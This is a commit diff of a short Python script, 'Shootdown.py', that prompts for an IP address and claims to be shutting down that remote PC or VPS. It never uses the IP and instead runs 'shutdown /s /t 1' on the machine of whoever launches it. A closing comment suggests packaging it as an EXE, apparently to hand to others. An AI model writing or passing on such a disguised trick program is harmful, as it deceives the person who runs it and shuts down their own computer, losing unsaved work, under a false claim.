d9dc0b841355b4be02d1819016b51a1907c3b1df
Xuif Xyz <93464524+XuifXyz@users.noreply.github.com>
2021-11-04 10:02:32 +0800

    Update Shootdown.py

--- Shootdown.py
+++ Shootdown.py
@@ -1,1 +1,7 @@
-import osimport timetarget = input("Enter IP : ")print(f"Shutdowning {target}  PC/VPS")time.sleep(0.5)os.system("shutdown /s /t 1")
+import os
+import time
+target = input("Enter IP : ")
+print(f"Shutdowning {target}  PC/VPS")
+time.sleep(0.5)
+os.system("shutdown /s /t 1")
+#Done And COPY SCRIPT PASTE TO EXE SCRIPT
